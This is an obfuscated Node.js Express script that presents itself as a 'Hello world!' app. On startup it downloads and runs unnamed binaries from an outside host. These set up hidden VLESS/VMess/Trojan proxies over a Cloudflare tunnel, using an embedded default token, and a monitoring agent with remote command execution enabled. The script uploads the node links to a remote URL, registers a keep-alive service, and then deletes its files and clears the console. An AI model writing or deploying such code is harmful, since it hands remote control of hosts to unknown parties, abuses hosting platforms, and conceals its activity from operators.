const _0x50dfe8=_0x390e;(function(_0x55d9e3,_0x123dda){const _0x3c0bc3=_0x390e,_0xa65148=_0x55d9e3();while(!![]){try{const _0x39b1e0=-parseInt(_0x3c0bc3(0x130))/0x1+parseInt(_0x3c0bc3(0x133))/0x2*(-parseInt(_0x3c0bc3(0x16d))/0x3)+-parseInt(_0x3c0bc3(0xce))/0x4+parseInt(_0x3c0bc3(0x155))/0x5+-parseInt(_0x3c0bc3(0xda))/0x6+-parseInt(_0x3c0bc3(0x12d))/0x7+parseInt(_0x3c0bc3(0x104))/0x8;if(_0x39b1e0===_0x123dda)break;else _0xa65148['push'](_0xa65148['shift']());}catch(_0x3c2ddf){_0xa65148['push'](_0xa65148['shift']());}}}(_0x50b3,0x2277f));const express=require(_0x50dfe8(0x11f)),app=express(),axios=require(_0x50dfe8(0x10c)),os=require('os'),fs=require('fs'),path=require(_0x50dfe8(0x102)),{promisify}=require(_0x50dfe8(0x13d)),exec=promisify(require('child_process')[_0x50dfe8(0x116)]),{execSync}=require(_0x50dfe8(0x125)),UPLOAD_URL=process[_0x50dfe8(0xc5)][_0x50dfe8(0xe6)]||'',PROJECT_URL=process[_0x50dfe8(0xc5)][_0x50dfe8(0xc2)]||'',AUTO_ACCESS=process[_0x50dfe8(0xc5)][_0x50dfe8(0xcc)]||![],FILE_PATH=process[_0x50dfe8(0xc5)]['FILE_PATH']||_0x50dfe8(0x171),SUB_PATH=process[_0x50dfe8(0xc5)]['SUB_PATH']||_0x50dfe8(0x164),PORT=process[_0x50dfe8(0xc5)][_0x50dfe8(0x107)]||process['env'][_0x50dfe8(0x180)]||0xbb8,UUID=process[_0x50dfe8(0xc5)][_0x50dfe8(0x15e)]||_0x50dfe8(0xff),NEZHA_SERVER=process[_0x50dfe8(0xc5)][_0x50dfe8(0x182)]||'',NEZHA_PORT=process['env'][_0x50dfe8(0x121)]||'',NEZHA_KEY=process[_0x50dfe8(0xc5)][_0x50dfe8(0xec)]||'',ARGO_DOMAIN=process[_0x50dfe8(0xc5)]['ARGO_DOMAIN']||_0x50dfe8(0xbd),ARGO_AUTH=process[_0x50dfe8(0xc5)][_0x50dfe8(0x148)]||'0cdbf9f2-ab69-4fdc-9513-07ae3988738a',ARGO_PORT=process[_0x50dfe8(0xc5)][_0x50dfe8(0x152)]||0x1f41,CFIP=process[_0x50dfe8(0xc5)]['CFIP']||_0x50dfe8(0xde),CFPORT=process[_0x50dfe8(0xc5)][_0x50dfe8(0x144)]||0x1bb,NAME=process[_0x50dfe8(0xc5)][_0x50dfe8(0xd1)]||'';!fs[_0x50dfe8(0x16f)](FILE_PATH)?(fs[_0x50dfe8(0x167)](FILE_PATH),console[_0x50dfe8(0x12f)](FILE_PATH+_0x50dfe8(0x163))):console[_0x50dfe8(0x12f)](FILE_PATH+_0x50dfe8(0x139));function generateRandomName(){const _0x616d57=_0x50dfe8,_0x564ea4=_0x616d57(0x147);let _0x117bcc='';for(let _0x1c046a=0x0;_0x1c046a<0x6;_0x1c046a++){_0x117bcc+=_0x564ea4[_0x616d57(0x12a)](Math['floor'](Math[_0x616d57(0x168)]()*_0x564ea4[_0x616d57(0xe1)]));}return _0x117bcc;}function _0x390e(_0x310a45,_0x24760f){const _0x50b3a9=_0x50b3();return _0x390e=function(_0x390efe,_0x7e17ab){_0x390efe=_0x390efe-0xbc;let _0x5abcfd=_0x50b3a9[_0x390efe];return _0x5abcfd;},_0x390e(_0x310a45,_0x24760f);}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x50dfe8(0xee)](FILE_PATH,phpName),webPath=path[_0x50dfe8(0xee)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x50dfe8(0xee)](FILE_PATH,_0x50dfe8(0x136)),listPath=path['join'](FILE_PATH,_0x50dfe8(0xe9)),bootLogPath=path[_0x50dfe8(0xee)](FILE_PATH,_0x50dfe8(0x13e)),configPath=path[_0x50dfe8(0xee)](FILE_PATH,_0x50dfe8(0x173));function deleteNodes(){const _0x5c2135=_0x50dfe8;try{if(!UPLOAD_URL)return;if(!fs[_0x5c2135(0x16f)](subPath))return;let _0x4452e5;try{_0x4452e5=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x211eb4=Buffer[_0x5c2135(0xfb)](_0x4452e5,'base64')[_0x5c2135(0x14d)]('utf-8'),_0x90dc40=_0x211eb4[_0x5c2135(0xd7)]('\x0a')[_0x5c2135(0xe8)](_0x358359=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5c2135(0x101)](_0x358359));if(_0x90dc40[_0x5c2135(0xe1)]===0x0)return;return axios[_0x5c2135(0xc9)](UPLOAD_URL+_0x5c2135(0x17b),JSON[_0x5c2135(0x17d)]({'nodes':_0x90dc40}),{'headers':{'Content-Type':_0x5c2135(0x15d)}})[_0x5c2135(0x154)](_0x3e24ae=>{return null;}),null;}catch(_0x49f098){return null;}}function cleanupOldFiles(){const _0x113e12=_0x50dfe8;try{const _0xd558e8=fs[_0x113e12(0x103)](FILE_PATH);_0xd558e8[_0x113e12(0x178)](_0x3c5b42=>{const _0x144161=_0x113e12,_0x22e1d4=path['join'](FILE_PATH,_0x3c5b42);try{const _0x4b5734=fs['statSync'](_0x22e1d4);_0x4b5734[_0x144161(0x15f)]()&&fs[_0x144161(0xd3)](_0x22e1d4);}catch(_0x379e1a){}});}catch(_0x3f0139){}}app[_0x50dfe8(0x113)]('/',function(_0x441492,_0x15a89e){const _0x50fc66=_0x50dfe8;_0x15a89e[_0x50fc66(0x179)](_0x50fc66(0x140));});function _0x50b3(){const _0x412f66=['vless','/trojan-argo','pipe','application/json','UUID','isFile','fileName','\x0avless://','trojan','\x20is\x20created','sub0118','win32','basename','mkdirSync','random','2083','https+local://8.8.8.8/dns-query','org','platform','691959jWNbve','quic','existsSync','/vmess-argo?ed=2560','./tmp','2053','config.json','127.0.0.1','2096','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','php\x20running\x20error:\x20','forEach','send','\x20-s\x20','/api/delete-nodes','Error\x20executing\x20command:\x20','stringify','set','false','PORT','ARGO_DOMAIN:','NEZHA_SERVER','tunnel.json','\x20-c\x20','App\x20is\x20running','\x0a\x20\x20credentials-file:\x20','railway.beo.dpdns.org','Add\x20automatic\x20access\x20task\x20faild:\x20','Content-Type','https://amd64.ssss.nyc.mn/bot','true','PROJECT_URL','\x20-p\x20','\x0a\x20\x20\x20\x20','env','Empowerment\x20failed\x20for\x20','\x20>\x20nul\x202>&1','http\x20server\x20is\x20running\x20on\x20port:','post','blackhole','Unhandled\x20error\x20in\x20startserver:','AUTO_ACCESS','.exe\x20>\x20nul\x202>&1','59412UulajK','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','freedom','NAME','tcp','unlinkSync','includes','error','&path=%2Ftrojan-argo%3Fed%3D2560#','split','rm\x20-rf\x20','xtls-rprx-vision','37752kQUbRL','writeFileSync','/vless-argo','Error\x20downloading\x20files:','cdns.doon.eu.org','createWriteStream','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','length','Download\x20','2087','arm','\x22\x20>\x20/dev/null\x202>&1','UPLOAD_URL','pkill\x20-f\x20\x22[','filter','list.txt','vmess','/vmess-argo','NEZHA_KEY','Empowerment\x20success\x20for\x20','join','unlink','status','block','fileUrl','&fp=firefox&type=ws&host=','clear','https://arm64.ssss.nyc.mn/bot','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','direct','nohup\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/config.json\x20>/dev/null\x202>&1\x20&','from','https://ipapi.co/json/','Nodes\x20uploaded\x20successfully','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','2b125437-c230-4b04-937c-f1e485271268','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','test','path','readdirSync','5358448jgUpfe','utf-8','8443','SERVER_PORT','close','/api/add-subscriptions','Error\x20reading\x20boot.log:','unshift','axios','response','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','http://ip-api.com/json/','443','readFileSync','http','get','map','none','exec','push','&path=%2Fvless-argo%3Fed%3D2560#','amd','https://amd64.ssss.nyc.mn/agent','arm64','automatic\x20access\x20task\x20added\x20successfully','arch','ArgoDomain:','express','substring','NEZHA_PORT','tls','listen','npm\x20running\x20error:\x20','child_process','\x20>/dev/null\x202>&1\x20&','/tunnel.yml\x20run','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','--tls','charAt','web\x20running\x20error:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','1877043dkSzLT','base64','log','247458gJEEHs','\x20-c\x20\x22','match','2MjuCti','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Unknown','sub.txt','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20successfully','\x20already\x20exists','then','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','all','util','boot.log','chmod','Hello\x20world!','\x0a\x20\x20tunnel:\x20','del\x20/f\x20/q\x20','\x20>/dev/null\x202>&1','CFPORT','stream','https://oooo.serv00.net/add-url','abcdefghijklmnopqrstuvwxyz','ARGO_AUTH','https://amd64.ssss.nyc.mn/v1','TunnelSecret','message','country_code','toString','Skipping\x20adding\x20automatic\x20access\x20task','?security=tls&sni=','taskkill\x20/f\x20/im\x20','https://arm64.ssss.nyc.mn/agent','ARGO_PORT','\x20is\x20running','catch','1193910lYCIWW','/sub.txt\x20saved\x20successfully','text/plain;\x20charset=utf-8','data','\x20failed:\x20'];_0x50b3=function(){return _0x412f66;};return _0x50b3();}async function generateConfig(){const _0x11af85=_0x50dfe8,_0x2be054={'log':{'access':'/dev/null','error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x11af85(0x15a),'settings':{'clients':[{'id':UUID,'flow':_0x11af85(0xd9)}],'decryption':_0x11af85(0x115),'fallbacks':[{'dest':0xbb9},{'path':_0x11af85(0xdc),'dest':0xbba},{'path':_0x11af85(0xeb),'dest':0xbbb},{'path':_0x11af85(0x15b),'dest':0xbbc}]},'streamSettings':{'network':_0x11af85(0xd2)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x11af85(0x15a),'settings':{'clients':[{'id':UUID}],'decryption':_0x11af85(0x115)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x11af85(0x174),'protocol':_0x11af85(0x15a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x11af85(0x115)},'streamSettings':{'network':'ws','security':_0x11af85(0x115),'wsSettings':{'path':_0x11af85(0xdc)}},'sniffing':{'enabled':!![],'destOverride':[_0x11af85(0x112),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x11af85(0xea),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x11af85(0xeb)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x11af85(0x122),_0x11af85(0x16e)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x11af85(0x174),'protocol':_0x11af85(0x162),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x11af85(0x115),'wsSettings':{'path':_0x11af85(0x15b)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x11af85(0x122),_0x11af85(0x16e)],'metadataOnly':![]}}],'dns':{'servers':[_0x11af85(0x16a)]},'outbounds':[{'protocol':_0x11af85(0xd0),'tag':_0x11af85(0xf7)},{'protocol':_0x11af85(0xca),'tag':_0x11af85(0xf1)}]};fs['writeFileSync'](path[_0x11af85(0xee)](FILE_PATH,'config.json'),JSON[_0x11af85(0x17d)](_0x2be054,null,0x2));}function getSystemArchitecture(){const _0x138c07=_0x50dfe8,_0x310b88=os[_0x138c07(0x11d)]();return _0x310b88==='arm'||_0x310b88===_0x138c07(0x11b)||_0x310b88==='aarch64'?_0x138c07(0xe4):_0x138c07(0x119);}function downloadFile(_0xcdc839,_0x1d7e69,_0x11ddd9){const _0x52ba6e=_0x50dfe8,_0x1d9ff1=_0xcdc839;!fs['existsSync'](FILE_PATH)&&fs[_0x52ba6e(0x167)](FILE_PATH,{'recursive':!![]});const _0x5ad65a=fs[_0x52ba6e(0xdf)](_0x1d9ff1);axios({'method':_0x52ba6e(0x113),'url':_0x1d7e69,'responseType':_0x52ba6e(0x145)})[_0x52ba6e(0x13a)](_0x1fc78d=>{const _0x410290=_0x52ba6e;_0x1fc78d[_0x410290(0x158)][_0x410290(0x15c)](_0x5ad65a),_0x5ad65a['on']('finish',()=>{const _0x34fbcb=_0x410290;_0x5ad65a[_0x34fbcb(0x108)](),console[_0x34fbcb(0x12f)]('Download\x20'+path[_0x34fbcb(0x166)](_0x1d9ff1)+_0x34fbcb(0x138)),_0x11ddd9(null,_0x1d9ff1);}),_0x5ad65a['on'](_0x410290(0xd5),_0x15e33e=>{const _0x49cb32=_0x410290;fs[_0x49cb32(0xef)](_0x1d9ff1,()=>{});const _0xd3c916='Download\x20'+path[_0x49cb32(0x166)](_0x1d9ff1)+'\x20failed:\x20'+_0x15e33e['message'];console[_0x49cb32(0xd5)](_0xd3c916),_0x11ddd9(_0xd3c916);});})[_0x52ba6e(0x154)](_0x52c0d2=>{const _0x31e97e=_0x52ba6e,_0x4385b8=_0x31e97e(0xe2)+path['basename'](_0x1d9ff1)+_0x31e97e(0x159)+_0x52c0d2[_0x31e97e(0x14b)];console[_0x31e97e(0xd5)](_0x4385b8),_0x11ddd9(_0x4385b8);});}async function downloadFilesAndRun(){const _0x280360=_0x50dfe8,_0x1b3503=getSystemArchitecture(),_0x5e93d3=getFilesForArchitecture(_0x1b3503);if(_0x5e93d3[_0x280360(0xe1)]===0x0){console['log'](_0x280360(0xcf));return;}const _0x315e3a=_0x5e93d3[_0x280360(0x114)](_0xc0eb9a=>{return new Promise((_0x47f588,_0x50d1e3)=>{const _0x3e3427=_0x390e;downloadFile(_0xc0eb9a[_0x3e3427(0x160)],_0xc0eb9a[_0x3e3427(0xf2)],(_0x24f772,_0x59dd7a)=>{_0x24f772?_0x50d1e3(_0x24f772):_0x47f588(_0x59dd7a);});});});try{await Promise[_0x280360(0x13c)](_0x315e3a);}catch(_0x304829){console[_0x280360(0xd5)](_0x280360(0xdd),_0x304829);return;}function _0x10484c(_0x7b129e){const _0x2114aa=_0x280360,_0x2aa70e=0x1fd;_0x7b129e[_0x2114aa(0x178)](_0x3a39f2=>{const _0x295036=_0x2114aa;fs[_0x295036(0x16f)](_0x3a39f2)&&fs[_0x295036(0x13f)](_0x3a39f2,_0x2aa70e,_0x3ab658=>{const _0x45d6ef=_0x295036;_0x3ab658?console['error'](_0x45d6ef(0xc6)+_0x3a39f2+':\x20'+_0x3ab658):console['log'](_0x45d6ef(0xed)+_0x3a39f2+':\x20'+_0x2aa70e[_0x45d6ef(0x14d)](0x8));});});}const _0x3f19a5=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x10484c(_0x3f19a5);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xeaa8d4=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x263eae=new Set([_0x280360(0x110),'8443',_0x280360(0x175),_0x280360(0xe3),_0x280360(0x169),_0x280360(0x172)]),_0x39c1f9=_0x263eae['has'](_0xeaa8d4)?_0x280360(0xc1):_0x280360(0x17f),_0x51cd88='\x0aclient_secret:\x20'+NEZHA_KEY+_0x280360(0x13b)+NEZHA_SERVER+_0x280360(0xf9)+_0x39c1f9+_0x280360(0x137)+UUID;fs['writeFileSync'](path[_0x280360(0xee)](FILE_PATH,'config.yaml'),_0x51cd88);const _0x204423=_0x280360(0xf8)+phpPath+_0x280360(0x131)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x204423),console[_0x280360(0x12f)](phpName+_0x280360(0x153)),await new Promise(_0x53b318=>setTimeout(_0x53b318,0x3e8));}catch(_0x4c8af2){console[_0x280360(0xd5)](_0x280360(0x177)+_0x4c8af2);}}else{let _0x2f06ae='';const _0x408a91=[_0x280360(0x110),_0x280360(0x106),_0x280360(0x175),_0x280360(0xe3),'2083',_0x280360(0x172)];_0x408a91[_0x280360(0xd4)](NEZHA_PORT)&&(_0x2f06ae=_0x280360(0x129));const _0x47f09d=_0x280360(0xf8)+npmPath+_0x280360(0x17a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x280360(0xc3)+NEZHA_KEY+'\x20'+_0x2f06ae+_0x280360(0xf6);try{await exec(_0x47f09d),console[_0x280360(0x12f)](npmName+_0x280360(0x153)),await new Promise(_0xd49954=>setTimeout(_0xd49954,0x3e8));}catch(_0x298033){console[_0x280360(0xd5)](_0x280360(0x124)+_0x298033);}}}else console[_0x280360(0x12f)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4aad25=_0x280360(0xf8)+webPath+_0x280360(0x184)+FILE_PATH+_0x280360(0xfa);try{await exec(_0x4aad25),console['log'](webName+_0x280360(0x153)),await new Promise(_0x57713b=>setTimeout(_0x57713b,0x3e8));}catch(_0x3d7ab3){console[_0x280360(0xd5)](_0x280360(0x12b)+_0x3d7ab3);}if(fs[_0x280360(0x16f)](botPath)){let _0x16159e;if(ARGO_AUTH[_0x280360(0x132)](/^[A-Z0-9a-z=]{120,250}$/))_0x16159e=_0x280360(0xe0)+ARGO_AUTH;else ARGO_AUTH[_0x280360(0x132)](/TunnelSecret/)?_0x16159e=_0x280360(0x128)+FILE_PATH+_0x280360(0x127):_0x16159e=_0x280360(0x12c)+FILE_PATH+_0x280360(0xfe)+ARGO_PORT;try{await exec(_0x280360(0xf8)+botPath+'\x20'+_0x16159e+_0x280360(0x126)),console[_0x280360(0x12f)](botName+_0x280360(0x153)),await new Promise(_0x568d09=>setTimeout(_0x568d09,0x7d0));}catch(_0x4b1ba0){console[_0x280360(0xd5)](_0x280360(0x17c)+_0x4b1ba0);}}await new Promise(_0x2aaf04=>setTimeout(_0x2aaf04,0x1388));}function getFilesForArchitecture(_0x2ba247){const _0x34eab1=_0x50dfe8;let _0x2b70da;_0x2ba247==='arm'?_0x2b70da=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x34eab1(0xf5)}]:_0x2b70da=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x34eab1(0xc0)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1aa125=_0x2ba247===_0x34eab1(0xe4)?_0x34eab1(0x151):_0x34eab1(0x11a);_0x2b70da[_0x34eab1(0x10b)]({'fileName':npmPath,'fileUrl':_0x1aa125});}else{const _0xf1436e=_0x2ba247===_0x34eab1(0xe4)?'https://arm64.ssss.nyc.mn/v1':_0x34eab1(0x149);_0x2b70da[_0x34eab1(0x10b)]({'fileName':phpPath,'fileUrl':_0xf1436e});}}return _0x2b70da;}function argoType(){const _0x3b8d93=_0x50dfe8;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3b8d93(0x12f)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x3b8d93(0x14a))){fs[_0x3b8d93(0xdb)](path['join'](FILE_PATH,_0x3b8d93(0x183)),ARGO_AUTH);const _0x434146=_0x3b8d93(0x141)+ARGO_AUTH['split']('\x22')[0xb]+_0x3b8d93(0xbc)+path[_0x3b8d93(0xee)](FILE_PATH,'tunnel.json')+_0x3b8d93(0x100)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x3b8d93(0xdb)](path['join'](FILE_PATH,'tunnel.yml'),_0x434146);}else console[_0x3b8d93(0x12f)](_0x3b8d93(0x176));}async function extractDomains(){const _0x4abfde=_0x50dfe8;let _0x3a2af3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3a2af3=ARGO_DOMAIN,console[_0x4abfde(0x12f)](_0x4abfde(0x181),_0x3a2af3),await _0x1e3a44(_0x3a2af3);else try{const _0x206296=fs[_0x4abfde(0x111)](path['join'](FILE_PATH,_0x4abfde(0x13e)),_0x4abfde(0x105)),_0x4b7e8b=_0x206296['split']('\x0a'),_0x1ca3c7=[];_0x4b7e8b[_0x4abfde(0x178)](_0x20155d=>{const _0x3aee2d=_0x4abfde,_0x25e53b=_0x20155d['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x25e53b){const _0x4ac331=_0x25e53b[0x1];_0x1ca3c7[_0x3aee2d(0x117)](_0x4ac331);}});if(_0x1ca3c7[_0x4abfde(0xe1)]>0x0)_0x3a2af3=_0x1ca3c7[0x0],console[_0x4abfde(0x12f)](_0x4abfde(0x11e),_0x3a2af3),await _0x1e3a44(_0x3a2af3);else{console[_0x4abfde(0x12f)](_0x4abfde(0x10e)),fs[_0x4abfde(0xd3)](path[_0x4abfde(0xee)](FILE_PATH,'boot.log'));async function _0xbed98c(){const _0x3fffe9=_0x4abfde;try{process[_0x3fffe9(0x16c)]==='win32'?await exec(_0x3fffe9(0x150)+botName+_0x3fffe9(0xcd)):await exec(_0x3fffe9(0xe7)+botName[_0x3fffe9(0x12a)](0x0)+']'+botName[_0x3fffe9(0x120)](0x1)+_0x3fffe9(0xe5));}catch(_0x3077da){}}_0xbed98c(),await new Promise(_0xfbb79=>setTimeout(_0xfbb79,0xbb8));const _0x3b1695='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4abfde(0xfe)+ARGO_PORT;try{await exec(_0x4abfde(0xf8)+botPath+'\x20'+_0x3b1695+_0x4abfde(0x126)),console['log'](botName+_0x4abfde(0x153)),await new Promise(_0x1d9c52=>setTimeout(_0x1d9c52,0xbb8)),await extractDomains();}catch(_0x4426f3){console[_0x4abfde(0xd5)](_0x4abfde(0x17c)+_0x4426f3);}}}catch(_0x539cda){console[_0x4abfde(0xd5)](_0x4abfde(0x10a),_0x539cda);}async function _0x4b13bf(){const _0x3c6cbd=_0x4abfde;try{const _0x30115c=await axios[_0x3c6cbd(0x113)](_0x3c6cbd(0xfc),{'timeout':0xbb8});if(_0x30115c[_0x3c6cbd(0x158)]&&_0x30115c['data'][_0x3c6cbd(0x14c)]&&_0x30115c[_0x3c6cbd(0x158)][_0x3c6cbd(0x16b)])return _0x30115c[_0x3c6cbd(0x158)][_0x3c6cbd(0x14c)]+'_'+_0x30115c[_0x3c6cbd(0x158)]['org'];}catch(_0x209a45){try{const _0xfcec23=await axios[_0x3c6cbd(0x113)](_0x3c6cbd(0x10f),{'timeout':0xbb8});if(_0xfcec23[_0x3c6cbd(0x158)]&&_0xfcec23[_0x3c6cbd(0x158)]['status']==='success'&&_0xfcec23[_0x3c6cbd(0x158)]['countryCode']&&_0xfcec23[_0x3c6cbd(0x158)][_0x3c6cbd(0x16b)])return _0xfcec23['data']['countryCode']+'_'+_0xfcec23['data'][_0x3c6cbd(0x16b)];}catch(_0x3aaea0){}}return _0x3c6cbd(0x135);}async function _0x1e3a44(_0x3ed5f7){const _0x3993d1=await _0x4b13bf(),_0x36b840=NAME?NAME+'-'+_0x3993d1:_0x3993d1;return new Promise(_0x5f5443=>{setTimeout(()=>{const _0x4854f3=_0x390e,_0x32abec={'v':'2','ps':''+_0x36b840,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4854f3(0x115),'net':'ws','type':'none','host':_0x3ed5f7,'path':_0x4854f3(0x170),'tls':_0x4854f3(0x122),'sni':_0x3ed5f7,'alpn':'','fp':'firefox'},_0x548fb0=_0x4854f3(0x161)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x3ed5f7+_0x4854f3(0xf3)+_0x3ed5f7+_0x4854f3(0x118)+_0x36b840+'\x0a\x0avmess://'+Buffer[_0x4854f3(0xfb)](JSON['stringify'](_0x32abec))[_0x4854f3(0x14d)](_0x4854f3(0x12e))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x4854f3(0x14f)+_0x3ed5f7+'&fp=firefox&type=ws&host='+_0x3ed5f7+_0x4854f3(0xd6)+_0x36b840+_0x4854f3(0xc4);console['log'](Buffer[_0x4854f3(0xfb)](_0x548fb0)[_0x4854f3(0x14d)](_0x4854f3(0x12e))),fs[_0x4854f3(0xdb)](subPath,Buffer['from'](_0x548fb0)[_0x4854f3(0x14d)](_0x4854f3(0x12e))),console['log'](FILE_PATH+_0x4854f3(0x156)),uploadNodes(),app[_0x4854f3(0x113)]('/'+SUB_PATH,(_0x33329d,_0x10a480)=>{const _0x4b30c8=_0x4854f3,_0x4d6da3=Buffer[_0x4b30c8(0xfb)](_0x548fb0)[_0x4b30c8(0x14d)]('base64');_0x10a480[_0x4b30c8(0x17e)](_0x4b30c8(0xbf),_0x4b30c8(0x157)),_0x10a480['send'](_0x4d6da3);}),_0x5f5443(_0x548fb0);},0x7d0);});}}async function uploadNodes(){const _0x41e31b=_0x50dfe8;if(UPLOAD_URL&&PROJECT_URL){const _0x1d45bc=PROJECT_URL+'/'+SUB_PATH,_0x60b690={'subscription':[_0x1d45bc]};try{const _0x3a796c=await axios[_0x41e31b(0xc9)](UPLOAD_URL+_0x41e31b(0x109),_0x60b690,{'headers':{'Content-Type':_0x41e31b(0x15d)}});return _0x3a796c&&_0x3a796c[_0x41e31b(0xf0)]===0xc8?(console[_0x41e31b(0x12f)]('Subscription\x20uploaded\x20successfully'),_0x3a796c):null;}catch(_0x5c6e7b){if(_0x5c6e7b[_0x41e31b(0x10d)]){if(_0x5c6e7b[_0x41e31b(0x10d)][_0x41e31b(0xf0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x41e31b(0x16f)](listPath))return;const _0x1bfe8d=fs[_0x41e31b(0x111)](listPath,_0x41e31b(0x105)),_0x591f49=_0x1bfe8d['split']('\x0a')[_0x41e31b(0xe8)](_0x3f6ce7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x41e31b(0x101)](_0x3f6ce7));if(_0x591f49[_0x41e31b(0xe1)]===0x0)return;const _0x5c0335=JSON[_0x41e31b(0x17d)]({'nodes':_0x591f49});try{const _0x381470=await axios[_0x41e31b(0xc9)](UPLOAD_URL+'/api/add-nodes',_0x5c0335,{'headers':{'Content-Type':_0x41e31b(0x15d)}});return _0x381470&&_0x381470[_0x41e31b(0xf0)]===0xc8?(console[_0x41e31b(0x12f)](_0x41e31b(0xfd)),_0x381470):null;}catch(_0x38fb3f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4a9f73=_0x390e,_0x2c9290=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2c9290['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2c9290[_0x4a9f73(0x117)](phpPath);process[_0x4a9f73(0x16c)]===_0x4a9f73(0x165)?exec(_0x4a9f73(0x142)+_0x2c9290['join']('\x20')+_0x4a9f73(0xc7),_0x32753d=>{const _0x902113=_0x4a9f73;console[_0x902113(0xf4)](),console[_0x902113(0x12f)](_0x902113(0x185)),console[_0x902113(0x12f)](_0x902113(0x134));}):exec(_0x4a9f73(0xd8)+_0x2c9290['join']('\x20')+_0x4a9f73(0x143),_0x2b88bd=>{const _0x2c06ff=_0x4a9f73;console[_0x2c06ff(0xf4)](),console[_0x2c06ff(0x12f)](_0x2c06ff(0x185)),console[_0x2c06ff(0x12f)](_0x2c06ff(0x134));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x287aaf=_0x50dfe8;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x287aaf(0x12f)](_0x287aaf(0x14e));return;}try{const _0x1a93ca=await axios['post'](_0x287aaf(0x146),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x287aaf(0x15d)}});return console[_0x287aaf(0x12f)](_0x287aaf(0x11c)),_0x1a93ca;}catch(_0x42d4a){return console['error'](_0x287aaf(0xbe)+_0x42d4a[_0x287aaf(0x14b)]),null;}}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2bdb63){console['error']('Error\x20in\x20startserver:',_0x2bdb63);}}startserver()[_0x50dfe8(0x154)](_0x54c6cc=>{const _0x57f38c=_0x50dfe8;console[_0x57f38c(0xd5)](_0x57f38c(0xcb),_0x54c6cc);}),app[_0x50dfe8(0x123)](PORT,()=>console['log'](_0x50dfe8(0xc8)+PORT+'!'));
